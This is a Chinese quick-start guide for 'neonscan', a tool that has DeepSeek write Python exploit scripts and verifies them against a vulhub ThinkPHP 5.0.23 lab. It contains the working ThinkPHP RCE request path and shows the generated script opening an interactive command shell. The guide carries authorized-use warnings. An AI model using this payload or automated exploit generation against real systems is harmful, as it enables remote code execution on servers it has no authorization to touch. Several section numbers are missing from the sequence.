# AI EXP 自动验证功能 - 快速开始

## 1. 启动服务

```bash
cd bishe00-master
go run main.go
```

或者使用编译后的可执行文件：

```bash
./neonscan
```

服务默认监听在 `http://localhost:8080`

## 2. 准备测试环境

### 方式1：使用真实漏洞环境

如果你有一个真实的漏洞测试环境（如ThinkPHP 5.0.23），可以直接使用。

### 方式2：使用Docker快速搭建

```bash
# 示例：搭建ThinkPHP 5.0.23漏洞环境
docker run -d -p 8888:80 vulhub/thinkphp:5.0.23
```

## 3. 测试基本功能（不启用验证）

创建测试文件 `test_basic.json`:

```json
{
  "provider": "deepseek",
  "apiKey": "your-deepseek-api-key",
  "model": "deepseek-chat",
  "autoVerify": false,
  "exp": {
    "name": "ThinkPHP 5.0.23 RCE",
    "exploitSuggestion": "ThinkPHP 5.0.23 远程代码执行漏洞",
    "steps": [
      {
        "method": "POST",
        "path": "/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]={{cmd}}",
        "headers": {
          "Content-Type": "application/x-www-form-urlencoded"
        },
        "validate": {
          "status": [200]
        }
      }
    ]
  }
}
```

发送请求：

```bash
curl -X POST http://localhost:8080/ai/exp/python \
  -H "Content-Type: application/json" \
  -d @test_basic.json
```

查看响应，应该包含生成的Python代码。

## 6. 使用生成的EXP

### 查找生成的EXP文件

```bash
ls -la /tmp/neonscan_exp/
```

你会看到类似这样的文件：
```
exp_attempt_1.py
exp_attempt_2.py  (如果有重试)
...
```

### 单次命令执行

```bash
python3 /tmp/neonscan_exp/exp_attempt_1.py \
  --target http://localhost:8888 \
  --cmd "whoami"
```

### 交互式Shell

```bash
python3 /tmp/neonscan_exp/exp_attempt_1.py \
  --target http://localhost:8888 \
  --shell
```

然后输入命令：
```
cmd> whoami
www-data
cmd> pwd
/var/www/html
cmd> ls -la
total 48
drwxr-xr-x 1 www-data www-data 4096 Jan 1 00:00 .
...
cmd> exit
```

## 7. 常见问题排查

### 问题1：Python未安装

**错误信息**:
```
[运行] ✗ EXP执行失败: exec: "python3": executable file not found in $PATH
```

**解决方法**:
```bash
# Ubuntu/Debian
sudo apt-get install python3 python3-pip

# CentOS/RHEL
sudo yum install python3 python3-pip

# macOS
brew install python3

# Windows
# 从 https://www.python.org/downloads/ 下载安装
```

### 问题2：requests库未安装

**错误信息**:
```
[运行] ✗ EXP执行失败: ModuleNotFoundError: No module named 'requests'
```

**解决方法**:
```bash
pip3 install requests
```

### 问题3：目标不可达

**错误信息**:
```
[运行] ✗ EXP执行失败: Connection refused
```

**解决方法**:
- 检查目标URL是否正确
- 检查目标服务是否运行
- 检查防火墙设置
- 检查网络连接

### 问题4：验证一直失败

**查看日志**:
```
[验证] ✗ 未检测到VULNERABLE特征
[提取] ✗ 无法提取命令输出
```

**可能原因**:
1. 目标不存在该漏洞
2. 漏洞利用方式不正确
3. 目标环境配置不同

**解决方法**:
1. 手动测试漏洞是否存在
2. 查看生成的EXP代码，手动调整
3. 尝试不同的测试命令

## 11. 安全提示

⚠️ **重要提示**:

1. 仅在授权的测试环境中使用
2. 不要对未授权的目标进行测试
3. 生成的EXP可能包含危险操作
4. 遵守相关法律法规
5. 妥善保管API密钥

## 12. 性能优化建议

1. **并发请求**: 系统支持并发处理多个请求
2. **缓存结果**: 对于相同的EXP规范，可以缓存生成结果
3. **超时设置**: 根据网络情况调整超时时间
4. **重试次数**: 根据成功率调整重试次数
